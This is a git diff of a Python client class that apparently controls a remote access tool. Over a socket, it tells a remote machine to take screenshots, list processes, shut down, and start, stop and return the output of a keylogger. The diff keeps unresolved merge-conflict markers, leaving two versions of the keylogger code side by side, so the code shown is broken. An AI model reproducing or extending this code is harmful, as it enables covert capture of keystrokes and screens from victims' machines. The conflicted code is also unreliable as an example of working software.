@@ -65,7 +65,7 @@ class Client:
 
   def shutdown(self):
     self.socket.send(CMD_SHUTDOWN.encode())
-    print("[SHUTDOWN] Disconnected from server")
+    return "[SHUTDOWN] Disconnected from server"
 
   def take_screenshot(self):
     self.socket.send(CMD_TAKE_SCREENSHOT.encode())
@@ -79,6 +79,7 @@ class Client:
         else:
           f.write(data)
 
+<<<<<<< Updated upstream
   def key_logger(self):
     with open(os.path.join(SCREENSHOT_PATH, 'keylog.txt'), 'w') as f:
       while True:
@@ -86,6 +87,24 @@ class Client:
         if not data:
           break
         f.write(data)
+=======
+  def start_keylogger(self):
+    self.socket.send(CMD_START_KEYLOGGER.encode())
+
+  def stop_keylogger(self):
+    self.socket.send(CMD_STOP_KEYLOGGER.encode())
+
+  def print_keylogger(self):
+    self.socket.send(CMD_PRINT_KEYLOGGER.encode())
+    keys = ""
+    while True:
+      data = self.socket.recv(BUFFER_SIZE)
+      if data == FLAG_FILE_END.encode():
+        break
+      else:
+        keys += data.decode()
+    return keys
+>>>>>>> Stashed changes
 
   def view_processes(self):
     self.socket.send(CMD_VIEW_PROCESSES.encode())
